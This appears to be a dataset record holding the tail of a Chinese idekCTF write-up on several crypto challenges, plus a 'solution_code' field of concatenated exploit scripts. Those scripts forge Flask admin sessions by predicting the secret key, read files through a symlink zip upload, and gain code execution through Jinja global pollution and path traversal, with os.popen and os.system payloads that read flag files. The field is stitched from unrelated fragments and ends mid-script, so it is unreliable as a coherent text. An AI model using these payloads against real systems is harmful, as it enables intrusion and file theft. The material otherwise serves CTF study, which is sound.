Zmod(n)(a0)==a1\nb1=int(str(f0(a0)).split('/')[0])\nb2=int(str(f1(a0)).split('/')[0])\n\nn=ZZ(gcd(b1,b2))\nd=99193023581616109152177764300040037859521925088272985981669959946817746109531909713425474710564402873765914926441545005839662821744603138460681680285655317684469203777533871394260260583839662628325884473084768835902143240687542429953968760669321064892423877370896609497584167478711224462305776836476437268587\na=Zmod(n)(a0)\nb=(Te[1]^2-(Te[0]^3+a*Te[0]))%n\n\nprint(n)\np=12290271213546041363951851773787980582602437964255454723585180242187866091592878156042540239644364150942318226563612517243038643884916020981628688069132457\nq=12106285759457603837646209698473787447139576157605716627376889077738609086595516271990595704705464336024969899141833853372028724555298162959385807206566981\nE1=EllipticCurve(GF(p),[a,b])\nE2=EllipticCurve(GF(q),[a,b])\nE=EllipticCurve(Zmod(n),[a,b])\n#order=E1.order()*E2.order()\norder=148789535372424163728266646450060056789282887632409478972504939920226619164296671910830162422173521086104260442096339694304886999126003562791358712412416317442287195786906697615489065379945573862193455179868067475036156124279466870451072060581891741234837916854904063588317305400955406105882208744056825746850\nprint(order)\ndd=invert(3,order)\nprint(long_to_bytes(ZZ((E(Me)*dd)[0])))\n'''\nb\"It is UNBREAKABLE, I tell you!! I'll even bet a flag on it, here it is: idek{Sh3_s3ll5_5n4k3_01l_0n_7h3_5e4_5h0r3}\"\n'''\n```\n\n### Chronophobia：\n由于不知道n的分解，我们无法计算出phi，也就无法快速计算出 \n\n$$2^{2^d}  mod  n$$ \n\n的值，但是题目提供了一个oracle，可以帮我们计算出给定token的计算结果的高200个十进制位，而低位大概是108个十进制位，于是我们可以通过以下方法求出给定token的低位：\n\n$$c_1\\equiv token^r mod n$$\n\n$$c_2=(token^2)^r mod n$$\n\n$$c_1^2-c_2\\equiv 0 mod n$$\n\n$$(c_{1h}+c_{1l})^2-(c_{2h}+c_{2l})\\equiv 0 mod n$$\n\n于是我们对两个低位使用二元coppersmith，就可以计算出结果，进而可以恢复整个结果。\n值得注意的地方是，二元coppersmith的参数很重要，一开始我直接用的默认m和d，发现结果虽然会满足 \n\n$$c_1^2-c_2\\equiv 0 mod n$$ \n\n，但是却并不是我们所需要的解，将参数设置为m=4,d=4，就可以把我们需要的结果copper出来。\n\n```py\n#sage\nfrom pwn import *\nimport itertools\nfrom Crypto.Util.number import *\n\ndef small_roots(f, bounds, m=2, d=None):\n    if not d:\n        d = f.degree()\n\n    R = f.base_ring()\n    N = R.cardinality()\n\n    f /= f.coefficients().pop(0)\n    f = f.change_ring(ZZ)\n\n    G = Sequence([], f.parent())\n    for i in range(m+1):\n        base = N^(m-i) * f^i\n        for shifts in itertools.product(range(d), repeat=f.nvariables()):\n            g = base * prod(map(power, f.variables(), shifts))\n            G.append(g)\n\n    B, monomials = G.coefficient_matrix()\n    monomials = vector(monomials)\n\n    factors = [monomial(*bounds) for monomial in monomials]\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, factor)\n\n    B = B.dense_matrix().LLL()\n\n    B = B.change_ring(QQ)\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, 1/factor)\n\n    H = Sequence([], f.parent().change_ring(QQ))\n    for h in filter(None, B*monomials):\n        H.append(h)\n        I = H.ideal()\n        if I.dimension() == -1:\n            H.pop()\n        elif I.dimension() == 0:\n            roots = []\n            for root in I.variety(ring=ZZ):\n                root = tuple(R(root[var]) for var in f.variables())\n                roots.append(root)\n            return roots\n\n    return []\n\ncontext.log_level=\"debug\"\n#s=process(['python3','oracle.py'])\ns=remote(\"chronophobia.chal.idek.team\",1337)\ns.recvuntil(b'Here is your random token: ')\nt=int(s.recvline()[:-1].decode())\ns.recvuntil(b'The public modulus is: ')\nn=int(s.recvline()[:-1].decode())\ns.recvuntil(b'Do 2^')\nd=int(s.recvline()[:3].decode())\nfac=[t,pow(t,2,n)]\nH=[]\nB=[]\nfor i in range(2):\n    s.recvuntil(b'>>> ')\n    s.sendline(b'1')\n    s.recvuntil(b'Tell me the token. ')\n    s.sendline(str(fac[i]).encode())\n    s.recvuntil(b'What is your calculation? ')\n    s.sendline(b'1')\n    s.recvuntil(b'Nope, the ans is ')\n    tmp=int(s.recvuntil(b'... (')[:-5].decode())\n    bits=int(s.recvline()[:3].decode())\n    H.append(tmp)\n    B.append(bits)\n\n\nP.<x,y>=PolynomialRing(Zmod(n))\n\n\nf1=H[0]*10**B[0]+x\nf2=H[1]*10**B[1]+y\nf=f1^2-f2\nroots=small_roots(f,(10**B[0],10**B[1]),m=4,d=4)[0]\nroots=(roots[0],roots[1])\nc1=roots[0]+H[0]*10**B[0]\nc2=roots[1]+H[1]*10**B[1]\nassert (c1^2-c2)%n==0\n\ns.recvuntil(b'>>> ')\ns.sendline(b'1')\ns.recvuntil(b'Tell me the token. ')\ns.sendline(str(t).encode())\ns.recvuntil(b'What is your calculation? ')\ns.sendline(str(c1).encode())\ns.recvline()\n\ns.recvuntil(b'>>> ')\ns.sendline(b'2')\ns.recvuntil(b'Give me the ticket. ')\ns.sendline(str(c1).encode())\ns.recvline()\n\ns.recvuntil(b'>>> ')\ns.sendline(b'3')\ns.recvline()\n\n#idek{St@rburst_str3@m!!!}\n```\n\n### Megalophobia:\n\n题目模拟了把RSA私钥加密发送给用户再由用户上传的过程。这个过程中，虽然不能直接修改密钥为特定内容，但可以对d,u进行随机修改。同时服务端使用了CRT-RSA的方式进行解密并可以返回解密后的明文长度是否为128。考虑将u修改，则当明文小于q时可以正常解密，否则解密结果为随机值，有很大概率长度为128。这样就可以二分得到q从而恢复私钥。\n\n```py\nfrom pwn import *\nfrom Crypto.Util.number import *\n\n# context.log_level = \"debug\"\nio = connect(\"megalophobia.chal.idek.team\", 1337)\n\nio.recvuntil(b\"::\\n|    \")\ndata = io.recvline().strip().decode()\npub, sec = data.split(\"::\")\ne = 0x10001\n\nn = int(pub, 16)\nsec = bytes.fromhex(sec)\nprint(f\"{n = }\")\nprint(sec)\n\nu_len = 0x40\ntarget_u_len = 0x39\nu_len_pos = (2 + 64) * 2 + 2 + 128 + 1\n\nsec = list(sec)\nsec[u_len_pos] ^= target_u_len ^ u_len\n\nsec = bytes(sec)\n\nio.recvuntil(b\"> (hex)\")\nio.sendline(sec.hex().encode())\n\nl = 1 << 511\nr = 2 * l -1\n\nfor i in range(500):\n    io.recvuntil(b\"|  > \")\n    mid = (l+r)//2\n    if i % 20 == 0:\n        print(hex(mid))\n    now = pow(mid, e, n)\n    io.sendline(long_to_bytes(now).hex().encode())\n    res = io.recvline()\n    if b\"Q_Q\" in res:\n        l = mid + 1\n    else:\n        r = mid \nprint(f\"{n = }\")\nprint(f\"{l = }\")\nprint(f\"{r = }\")\nprint(f\"{sec = }\")\nio.interactive()\n```\n\n### Primonumerophobia\n\n这个题有一个 `1*47` 的随机变量 `s` ，`47*512` 的矩阵 $$mat_1, mat_2$$， 得到 $$s\\times mat_1=p, s\\times mat_2=q$$，然后把 `p, q` 当成二进制数，保证 `p, q` 都是质数，现在知道$$mat_1, mat_2, n=p\\times q$$，求 `p, q`。所有运算都是在 `GF(2)` 下。\n我们可以考虑枚举 `p` 的低 24 位，由于已知 `n` ，我们可以对应计算出若干个 `q` 的低 24 位，知道 48 位信息之后可以通过异或线性基的方式把 `p` 跟 `q` 的其余位都计算出来（因为每一个 bit 对应 `mat` 的一个列向量，列向量一共 47 维，所以只需要 47 个线性无关的列向量就能得到整个空间的一组基，其余的可以通过这组基异或得到）。\n\n```py\nd = 47\nM = Matrix(GF(2),47,47)\ntaps = [47, 43, 41, 37, 31, 29, 23, 19, 17, 13, 11, 7, 5, 3, 2]\nfor _ in range(d - 1):\n    M[_+1,_] = 1\nfor _ in taps:\n    M[47-_,-1] = 1\n\n# states = vector(GF(2),) 中间有个47bits的states，恢复出来即可\ntimes1 = 1160\nM_tmp = M**((times1-1)*512)\nnew_mat1 = Matrix(GF(2),d,512)\nfor i in range(512):\n    for j in range(d):\n        new_mat1[j,i] = M_tmp[j,0]\n    M_tmp *= M\n\n# 往后推q的关系，比如说输出是[LOG]447\ntimes2 = 447\nM_tmp = M_tmp * M**((times2-1)*512)\nnew_mat2 = Matrix(GF(2),d,512)\nfor i in range(512):\n    for j in range(d):\n        new_mat2[j,i] = M_tmp[j, 0]\n    M_tmp *= M\n\nfor j in range(30):\n    for i in range(d):\n        print(new_mat1[i, j], end = \" \")\n    print()\n\nwith open(\"mat1.txt\", \"w\") as f:\n     for i in new_mat1.T:\n         l = []\n         for j in i:\n             l.append(str(int(j)))\n         f.write(\" \".join(l)+\"\\n\")\n\nwith open(\"mat2.txt\", \"w\") as f:\n     for i in new_mat2.T:\n         l = []\n         for j in i:\n             l.append(str(int(j)))\n         f.write(\" \".join(l)+\"\\n\")\n```\n\n```py\nfrom Crypto.Util.number import *\nimport random\n\nn = 78189483779073760819769596415493404181115737255987326126790953924148600157623709942134043192581448967829591214999561812461790206591977861764710056434977125005626712442593271233036617073503751799983263888626278748439349756982639988997517983470845431197233107232933125334078771472039280629203017666578936360521\n\nlast = []\nbinn = bin(n)[2:]\nfor i in range(24):\n    x = binn[-(i + 1) : ]\n    last.append(int(x, 2))\n\ndef dfs(p, cur, x):\n\n    global ans\n\n    if x == 24:\n        ans.append((p[-1], int(cur, 2)))\n        return\n\n    _p = p[x]\n    _n = last[x]\n\n    t = \"0\" + \"\".join(cur)\n    _q = int(t, 2)\n    if ((_p * _q) & ((1 << (x+1)) - 1)) == _n:\n        dfs(p, \"0\" + cur, x + 1)\n\n    t = \"1\" + \"\".join(cur)\n    _q = int(t, 2)\n    if ((_p * _q) & ((1 << (x+1)) - 1)) == _n:\n        dfs(p, \"1\" + cur, x + 1)\n\nans = []\n\nfor i in range(1 << 24):\n    cur = \"\"\n    p = []\n    binp = bin(i)[2:]\n    binp = ((24 - len(binp)) * \"0\") + binp\n    for j in range(24):\n        p.append(int(binp[-(j+1) : ], 2))\n    dfs(p, cur, 0)\n\nwith open(\"pq.txt\", \"w\") as f:\n    for p, q in ans:\n        f.write(str(p) + \" \" + str(q) + \"\\n\")\n```\n\n```cpp\n#include <set>\n#include <map>\n#include <cmath>\n#include <cassert>\n#include <queue>\n#include <vector>\n#include <cstdio>\n#include <numeric>\n#include <cstring>\n#include <iostream>\n#include <algorithm>\nusing namespace std;\nusing ll = long long;\nusing vint = vector<int>;\nusing namespace std;\n\ninline int read() {\n  int x = 0, f = 1; char ch = getchar();\n  for (; ch < '0' || ch > '9'; ch = getchar()) if (ch == '-') f = -1;\n  for (; ch >= '0' && ch <= '9'; ch = getchar()) x = x * 10 + ch - '0';\n  return x * f;\n}\n\nint main() {\n  FILE *f = fopen(\"pq.txt\", \"r\");\n  vector<ll> p(10000000), q(10000000);\n  ll x, y;\n  int n = 0;\n  while (fscanf(f, \"%lld%lld\", &x, &y) != EOF) {\n    p[n] = x;\n    q[n] = y;\n    ++n;\n  }\n  fclose(f);\n  f = fopen(\"mat1.txt\", \"r\");\n  vector<ll> mat1(512), mat2(512);\n  for (int i = 0; i < 512; i++) {\n    ll x = 0;\n    for (int j = 0; j < 47; j++) {\n      ll bit;\n      fscanf(f, \"%lld\", &bit);\n      x |= bit << j;\n    }\n    mat1[i] = x;\n  }\n  fclose(f);\n  f = fopen(\"mat2.txt\", \"r\");\n  for (int i = 0; i < 512; i++) {\n    ll x = 0;\n    for (int j = 0; j < 47; j++) {\n      ll bit;\n      fscanf(f, \"%lld\", &bit);\n      x |= bit << j;\n    }\n    mat2[i] = x;\n  }\n  fclose(f);\n  reverse(mat1.begin(), mat1.end());\n  reverse(mat2.begin(), mat2.end());\n  vector<ll> l;\n  vector<pair<ll, ll>> B;\n  for (int i = 0; i < 23; i++)\n    l.push_back(mat1[i]);\n  for (int i = 0; i < 24; i++)\n    l.push_back(mat2[i]);\n  for (int i = 0; i < 47; i++) {\n    ll x = l[i];\n    ll p = 1ll << i;\n    for (auto num : B) {\n      ll y = num.first, pos = num.second;\n      if ((y ^ x) < x) {\n        x ^= y;\n        p ^= pos;\n      }\n    }\n    for (auto &num : B) {\n      ll y = num.first;\n      if ((y ^ x) < y) {\n        num.first ^= x;\n        num.second ^= p;\n      }\n    }\n    assert(x);\n    B.push_back(make_pair(x, p));\n  }\n  vector<vector<int>> posp(512, vector<int>()), posq(512, vector<int>());\n  for (int i = 0; i < 512; i++) {\n    ll x = mat1[i];\n    ll p = 0;\n    for (int j = 0; j < 47; j++)\n      if (x & B[j].first)\n        p ^= B[j].second;\n    for (int j = 0; j < 47; j++)\n      if ((p >> j) & 1)\n        posp[i].push_back(j);\n    ll check = 0;\n    for (int x : posp[i])\n      check ^= l[x];\n    assert(check == x);\n  }\n  for (int i = 0; i < 512; i++) {\n    ll x = mat2[i];\n    ll p = 0;\n    for (int j = 0; j < 47; j++)\n      if (x & B[j].first)\n        p ^= B[j].second;\n    for (int j = 0; j < 47; j++)\n      if ((p >> j) & 1)\n        posq[i].push_back(j);\n    ll check = 0;\n    for (int x : posq[i])\n      check ^= l[x];\n    assert(check == x);\n  }\n\n  // this file could be 8.6G big!\n  f = fopen(\"real_pq.txt\", \"w\");\n  vector<int> _l(47);\n\n  for (int i = 0; i < n; i++) {\n    ll _p = p[i], _q = q[i];\n    if (i % 100000 == 0)\n      printf(\"%d\\n\", i);\n\n    for (int j = 0; j < 23; j++)\n      _l[j] = (_p >> j) & 1;\n    for (int j = 0; j < 24; j++)\n      _l[j + 23] = (_q >> j) & 1;\n    for (int i = 511; i >= 0; i--) {\n      int bit_p = 0;\n      for (ll x : posp[i]) {\n        bit_p ^= _l[x];\n      }\n      fprintf(f, \"%c\", '0' + bit_p);\n      if (i < 23) {\n        assert(bit_p == _l[i]);\n      }\n    }\n    fprintf(f, \" \");\n    for (int i = 511; i >= 0; i--) {\n      int bit_q = 0;\n      for (ll x : posq[i])\n        bit_q ^= _l[x];\n      fprintf(f, \"%c\", '0' + bit_q);\n      if (i < 24) {\n        assert(bit_q == _l[i + 23]);\n      }\n    }\n    fprintf(f, \"\\n\");\n  }\n  fclose(f);\n  return 0;\n}\n```\n\n```py\np = 8148641146281585626599965707019875487540363795516672614500530970713004312213378852992447549855928600229171345524388095399807768385341698813126095446000969\nq = 9595401536948702154260950703331322993513137152314157248261000347717193558940157103084976690783331034882701052399602064548436624663369151807143327408382209\nenc = 39952631182502523101053953538875437560829302998610236142339435591980522271590392249355510253125310494063081880512061476177621613835835483055753316172267380484804011034657479491794064534740537749793563744927827732170347495398050941609682485707331552759412916426691849669362897656967530464847648838434750188588\nphi = (p-1) * (q-1)\nfrom Crypto.Util.number import *\ne = inverse(0x10001, phi)\nm = pow(enc, e, p*q)\nprint(long_to_bytes(m))\n# b'idek{th3_prim3_g3n3r4ti0n_is_c001_but_n0t_s3cur3_QAQ}\\n'\n```\n\n### Psychophobia:\n\ns大概会差`O//8`的k倍(k<8)，修复后的si，发现`GCD(si, O)==4`或者`GCD(si, O)==8`都是唯一的，能够通过的s都是二者之一，并且这两个数的i存在`i2-i1=4`,即存在`(0,4),(1,5),(2,6),(3,7)`这几种选择可能(例如k=1时如果GCD(s1,O)==4,那么GCD(s5,O)==8)。那么分析`k=0，GCD(s0, O)==4`，`k=4, GCD(s4, O)==8`的频率，以此类推k=1..8，gcd=4,8。再分析对应i和gcd情况下的选择（0可以排除掉，对应的一定选4，例如将）。该题目中测试结果为当`GCD(s1, O)==4`时大概率s1为正确解，当`GCD(s1, O)==8`时大概率s5为正确解。当`GCD(s2, O)==4`时大概率s6为正确解，当`GCD(s2, O)==8`时大概率s2为正确解。当`GCD(s3, O)==4`时大概率s3为正确解，当`GCD(s3, O)==8`时大概率s7为正确解。大概有70%的概率fix正确，多跑几次即可。\n\n```py\nfrom hashlib import sha256\nfrom netcat import *\nfrom Crypto.Util.number import *\nfrom ast import literal_eval\n\ndef fix(r, s):\n    rs = 0\n    idx = []\n    gcds = []\n    for i in range(8):\n        si = (s + i * (O // 8)) % O\n        u1 = (h * inverse(si, O)) % O\n        u2 = (r * inverse(si, O)) % O\n        if GCD(si, O) == 4 or GCD(si, O) == 8:\n            idx.append(i)\n            gcds.append(GCD(si, O))\n    if idx[0] == 0:\n        x = idx[1]\n    elif idx[0] == 1:\n        if gcds[0] == 4:\n            x = idx[0]\n        else:\n            x = idx[1]\n    elif idx[0] == 2:\n        if gcds[0] == 4:\n            x = idx[1]\n        else:\n            x = idx[0]\n    elif idx[0] == 3:\n        if gcds[0] == 4:\n            x = idx[0]\n        else:\n            x = idx[1]\n    fix_s = (s + x * (O // 8)) % O\n    return fix_s\n\nP = 2**255 - 19\nA = 486662\nB = 1\n# Order of the Curve\nO = 57896044618658097711785492504343953926856930875039260848015607506283634007912\n\nwhile True:\n    host, port = 'psychophobia.chal.idek.team 1337'.split(' ')\n    io = remote(host, int(port))\n    io.recvuntil(b\"|    > \")\n    io.sendline(b\"1\")\n    msg = \"1 here, requesting flag for pick-up.\"\n    h = int.from_bytes(sha256(msg.encode()).digest(), 'big')\n    for round in range(500):\n        print(f\"round-{round}\")\n        io.recvuntil(b'Please fix :: ')\n        tmp = io.recvline()\n        sig = literal_eval(tmp.strip().decode())\n        r, s = sig\n        fix_s = fix(r, s)\n        io.recvuntil(b'|    > (r,s) ')\n        io.sendline(f'{r},{fix_s}'.encode())\n\n    io.recvuntil(b\"signatures!\\n\")\n    io.recvline()\n    tmp = io.recvline()\n    print(tmp)\n    if b\"{\" in tmp:\n        print(\"get flag!\")\n        io.close()\n        input()\n    else:\n        io.close()\n```\n\n## 结语\n\n剩下的三个web和四个密码之后我们会复现整理后再推出相关的文章与大家一起交流学习.敬请期待,如果有什么问题欢迎发邮件询问\n\n\n", "solution_code": "@app.route(\"/flag\")\ndef flag():\n    if not session.get(\"admin\"):\n        return \"Unauthorized!\"\n    return subprocess.run(\"./flag\", shell=True, stdout=subprocess.PIPE).stdout.decode(\"utf-8\")\n\napp.config[\"SECRET_KEY\"] = os.environ[\"SECRET_KEY\"]\n\n@app.route(\"/upload\", methods=[\"GET\", \"POST\"])\ndef upload():\n    if not session.get(\"uid\"):\n        return redirect(\"/login\")\n    if request.method == \"GET\":\n        return render_template(\"upload.html\")\n\n    if \"file\" not in request.files:\n        flash(\"You didn't upload a file!\", \"danger\")\n        return render_template(\"upload.html\")\n    \n    file = request.files[\"file\"]\n    uuidpath = str(uuid.uuid4())\n    filename = f\"{DATA_DIR}uploadraw/{uuidpath}.zip\"\n    file.save(filename)\n    subprocess.call([\"unzip\", filename, \"-d\", f\"{DATA_DIR}uploads/{uuidpath}\"])    \n    flash(f'Your unique ID is <a href=\"/uploads/{uuidpath}\">{uuidpath}</a>!', \"success\")\n    logger.info(f\"User {session.get('uid')} uploaded file {uuidpath}\")\n    return redirect(\"/upload\")\n\n@app.route(\"/uploads/<path:path>\")\ndef uploads(path):\n    try:\n        return send_from_directory(DATA_DIR + \"uploads\", path)\n    except PermissionError:\n        abort(404)\n\n# Configure logging\nLOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')\nLOG_HANDLER.setFormatter(logging.Formatter(fmt=\"[{levelname}] [{asctime}] {message}\", style='{'))\nlogger = logging.getLogger(\"application\")\nlogger.addHandler(LOG_HANDLER)\nlogger.propagate = False\nfor handler in logging.root.handlers[:]:\n    logging.root.removeHandler(handler)\nlogging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')\nlogging.getLogger().addHandler(logging.StreamHandler())\n\ndecoded = {'admin': True, 'uid': userinfo['username']}\n\nimport base64\n\nimport requests, re, time, datetime, random\nimport flask_unsign\n\nsess = requests.session()\nSECRET_OFFSET = -67198624 * 1000\nuserinfo = {\"username\": \"yyds\", \"password\": \"yyds\"}\nbaseurl = \"http://127.0.0.1:1337/\"\npocZip = \"UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA\"\ncookie = \"\"\nlog_url = \"\"\n\ndef register():\n    reg_url = baseurl + \"register\"\n    sess.post(reg_url, userinfo)\n\n\ndef login():\n    global cookie\n    set_cookie = sess.post(baseurl + \"login\", data=userinfo, allow_redirects=False).headers['Set-Cookie']\n    cookie = set_cookie[8:82]\n\n\ndef upload():\n    global log_url\n    log_url = re.search('<a href=\"/uploads/.*\">', sess.post(\n        baseurl + \"upload\", headers={'Cookie': f'session={cookie}'},\n        files={'file': base64.b64decode(pocZip)}).text).group()[9:-2]\n\ndef read():\n    server_log = baseurl + log_url + \"/server.log\"\n    config = baseurl + log_url + \"/config.py\"\n    SECRET_OFFSET = int(re.findall(\"SECRET_OFFSET = (.*?) # REDACTED\", sess.get(config).text)[0]) * 1000\n    log = sess.get(server_log).text\n    now = (time.mktime(datetime.datetime.strptime(log.split('\\n')[0][1:20], \"%Y-%m-%d %H:%M:%S\").timetuple())) * 1000\n    return SECRET_OFFSET,now\n\n\n\nif __name__ == '__main__':\n    register()\n    login()\n    upload()\n    SECRET_OFFSET, now = read()\n    while 1:\n        decoded = {'admin': True, 'uid': userinfo['username']}\n        random.seed(round(now + int(SECRET_OFFSET)))\n        SECRET_KEY = \"\".join([hex(random.randint(0, 15)) for x in range(32)]).replace(\"0x\", \"\")\n        flag_url = baseurl + \"flag\"\n        res = sess.get(flag_url, headers={'Cookie': f'session={flask_unsign.sign(decoded, SECRET_KEY)}'}).text\n        if \"idek\" not in res:\n            now += 1\n            print(now)\n            continue\n        print(res)\n        break\n\nimport requests\nimport re\n\nbase_url = 'http://127.0.0.1:1337'\nurl      = f'{base_url}/api/manage_tasks'\nexp_url  = f'{base_url}/../../usr/local/lib/python3.8/turtle.py'\napp      = '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app'\n\n# add eval to template globals\nrequests.post(url, json={\"task\": f\"{app}.env\", \"status\": \"yolo\"})\nrequests.post(url, json={\"task\": f\"{app}._got_first_request\", \"status\": None})\n\n# bypass jinja directory traversal check\nrequests.post(url, json={\"task\": \"__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir\", \"status\": \"foobar\"})\n\n# change jinja_env\nrequests.post(url, json={\"task\": f\"{app}.jinja_env.variable_start_string\", \"status\": \"\"\"'\"\"']:\\n            value = \"\"\"})\nrequests.post(url, json={\"task\": f\"{app}.jinja_env.variable_end_string\", \"status\": \"\\n\"})\n\n# add global vars\nrequests.post(url, json={\"task\": f\"{app}.jinja_env.globals.value\", \"status\": \"__import__('os').popen('cat /flag-*.txt').read()\"})\n\n# get flag\ns = requests.Session()\nr = requests.Request(method='GET', url=exp_url)\np = r.prepare()\np.url = exp_url\nr = s.send(p)\nflag = re.findall('idek{.*}', r.text)[0]\nprint(flag)\n\nimport requests\nimport re\n\nbase_url = 'http://127.0.0.1:1337'\nurl      = f'{base_url}/api/manage_tasks'\nexp_url  = f'{base_url}/../Dockerfile'\n\n# bypass jinja directory traversal check\nrequests.post(url, json={\"task\": \"__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir\", \"status\": \"foobar\"})\n\n# get flag\ns = requests.Session()\nr = requests.Request(method='GET', url=exp_url)\np = r.prepare()\np.url = exp_url\nr = s.send(p)\nflag = re.findall('idek{.*}', r.text)[0]\nprint(flag)\n\nimport requests, re\n\nbase_url = 'http://127.0.0.1:1337'\nurl      = f'{base_url}/api/manage_tasks'\nflag_url = f'{base_url}/../../tmp/flag'\n\npayload = '''*\n__import__('os').system('cp /flag* /tmp/flag')\n#'''\n\n# bypass jinja directory traversal check\nrequests.post(url, json={\"task\": \"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.os.path.pardir\", \"status\": \"foobar\"})\n\n# replace exported to prepare rce\nrequests.post(url, json={\"task\": \"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0\", \"status\": payload})\n\n# trigger rce\nrequests.get(f'{base_url}/home.html')\n\n# get flag\ns = requests.Session()\nr = requests.Request(method='GET', url=flag_url)\np = r.prepare()\np.url = flag_url\nr = s.send(p)\nflag = re.findall('idek{.*}', r.text)[0]\nprint(flag)\n\nfrom pwn import *\nhost, port = 'cleithrophobia.chal.idek.team:1337'.split(':')\nio = remote(host, int(port))\n\n\ndef oracle(payload):\n    io.sendlineafter(b'|    > (hex) ', payload.hex().encode())\n    io.recvuntil(b'|\\n|   ')\n    now = bytes.fromhex(io.recvline().strip().decode())\n    return [now[i:i+16] for i in range(0, len(now), 16)][::-1]\n\n\ndef enc(block):\n    assert len(block) == 16\n    payload = b'\\x00' * 32 + block\n    res = oracle(payload)\n    return res[3]\n\n\ndef dec(block):\n    assert len(block) == 16\n    mask = enc(b'\\x10' * 16)\n    payload = b'\\x00' * 32 + xor(block, mask)\n    res = oracle(payload)\n    return xor(res[0], res[1])\n\n# rand, b1, b2, b3, pad\n# b0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)\n# b0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))\nio.recvuntil(b'flag = ')\nflag = bytes.fromhex(io.recvline().strip().decode())\nflag = [flag[i:i+16] for i in range(0, len(flag), 16)][::-1]\nt1 = [flag[0]]\nfor i in range(len(flag) - 1):\n    t1 += [enc(xor(flag[i+1], t1[-1]))]\nt1 = t1[:1] + t1[1:][::-1]\nt2 = [flag[0]]\nfor i in range(len(flag) - 1):\n    t2 += [dec(xor(t1[i+1], t2[-1]))]\nflag = b''.join(t2)\nprint(flag)\n# flag{wh0_3v3n_c0m3s_up_w1th_r1d1cul0us_sch3m3s_l1k3_th1s__0h_w41t__1_d0}\n\n#sage\nfrom gmpy2 import *\nfrom Crypto.Util.number import long_to_bytes\n\ndef add(P, Q):\n    x0, y0 = P\n    x1, y1 = Q\n    if P == Q:\n        lmd = (3*x0**2+a)/(2*y0)\n    else:\n        lmd = (y1-y0) / (x1-x0)\n    x2 = lmd**2 - x1 - x0\n    y2 = lmd*(x0 - x2) - y0\n    return x2, y2\nR.<a> = PolynomialRing(ZZ)\nP = (ZZ(int.from_bytes(b\"ECRSA offers added security by elliptic entropy.\", 'big')), 2)\nP2 = add(P, P)\nP3 = add(P, P2)\nf = str(P3[0]).split('/') + str(P3[1]).split('/')\nf = [R(i) for i in f]\n\nTe = (79615329406682121028641446306520032869660130854153788352536429332441749473394735222836513266191300847548366008281109415002581029448905418880962931523411475044527689429201653146200630804486870653795937020571749192405439450656659472253086567149309166068212312829071678837253421625687772396105149376211148834937,114576105009077728778286635566905404081211824310970349548035698466418670695753458926421098950418414701335730404414509232776047250916535638430446206810902182305851611221604003509735478943147034397832291215478617613443375140890349118302843641726392253137668650493281241262406250679891685430326869028996183320982)\nMe = (115076663389968253954821343472300155800654332223208277786605760890770425514748910251950393842983935903563187546008731344369976804796963863865102277460894378910744413097852034635455187460730497479244094103353376650220792908529826147612199680141743585684118885745149209575053969106545841997245139943766220688789,74232642959425795109854140949498935461683632963630260034964643066394703345139733396470958836932831941672213466233486926122670098721687149917605871805886006479766670309639660332339984667770417687192717160061980507220617662938436637445370463397769213554349920956877041619061811087875024276435043752581073552318)\n\nf0 = f[0] - f[1] * Te[0]\nf1 = f[2] - f[3] * Te[1]\nf2 = Te[0]**3 + a*Te[0] - Te[1]**2-(Me[0]**3 + a*Me[0] - Me[1]**2)\nprint(f2)\na0=-1019268867267849424908357367733931941383149668286864008861662442680604058151693707791547011105186550019092586871229367602480951232469366295595128740384313397226761125592114592001298261062965213964211518794413291961567779146411551935492149763883963272734637871273976142997464735273842094527385872407012350495753298964870092922939941557312324244091706263803037684216879489854927518197495340486943316099448245524778860809444971443935794707968413693163036741320366137839392605690457251072731869232133843078162397057596189198269026990658078279998575424676768178510688889622050681034958153231556029864713685758814785896436116013310016899574654253785383489362957328536913784532588181648611237704933470028564747329012603054002623952267126949886810588734363614455501359064859547724824540676184962858003962647114120432607459636061800842389469449254464940592103479283633803337327710969181902456604551946745128222513462440426982787689316/35461333983286132926179897165780122930994201369054489434069331558328676041354175029113880576792635056014821537727621929367395775348058444984139345937482903866216723668650381489254556656243626825448157082781627457815353457873166675359113112992434419615906572916077530737800547480858069601139990567555071853852\n#assert Zmod(n)(a0)==a1\nb1=int(str(f0(a0)).split('/')[0])\nb2=int(str(f1(a0)).split('/')[0])\n\nn=ZZ(gcd(b1,b2))\nd=99193023581616109152177764300040037859521925088272985981669959946817746109531909713425474710564402873765914926441545005839662821744603138460681680285655317684469203777533871394260260583839662628325884473084768835902143240687542429953968760669321064892423877370896609497584167478711224462305776836476437268587\na=Zmod(n)(a0)\nb=(Te[1]^2-(Te[0]^3+a*Te[0]))%n\n\nprint(n)\np=12290271213546041363951851773787980582602437964255454723585180242187866091592878156042540239644364150942318226563612517243038643884916020981628688069132457\nq=12106285759457603837646209698473787447139576157605716627376889077738609086595516271990595704705464336024969899141833853372028724555298162959385807206566981\nE1=EllipticCurve(GF(p),[a,b])\nE2=EllipticCurve(GF(q),[a,b])\nE=EllipticCurve(Zmod(n),[a,b])